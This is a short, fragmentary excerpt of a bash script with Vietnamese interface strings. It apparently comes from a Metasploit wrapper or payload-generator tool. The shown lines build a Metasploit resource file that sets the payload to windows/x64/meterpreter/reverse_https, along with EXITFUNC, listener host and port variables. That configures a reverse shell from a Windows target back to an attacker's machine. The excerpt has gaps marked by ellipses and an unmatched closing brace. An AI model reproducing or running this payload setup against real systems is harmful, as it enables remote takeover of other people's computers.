...
no="     Không "
cat << !
Các tùy chọn của tải trọng (windows/x64/meterpreter/reverse_https):
...
config_file="$payload_path_present/Config/config"
	echo "set payload windows/x64/meterpreter/reverse_https" >> $rc_file
	echo "set EXITFUNC $exitfunc" >> $rc_file
	paylo="windows/x64/meterpreter/reverse_https"
	lhost=$lhost
	lport=$lport
}
